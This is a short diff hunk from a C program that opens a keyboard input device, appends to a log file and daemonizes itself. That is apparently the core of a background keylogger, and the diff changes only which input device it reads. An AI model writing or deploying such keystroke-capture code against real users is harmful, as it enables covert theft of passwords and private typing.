@@ -7,7 +7,7 @@
 int main(int argc, char **argv)
 {
     struct input_event ev;
-    int keyboard = open("/dev/input/event3", O_RDONLY);
+    int keyboard = open("/dev/input/event2", O_RDONLY);
     FILE *fp = fopen("log.txt", "a");
     daemonize();
     while (1)
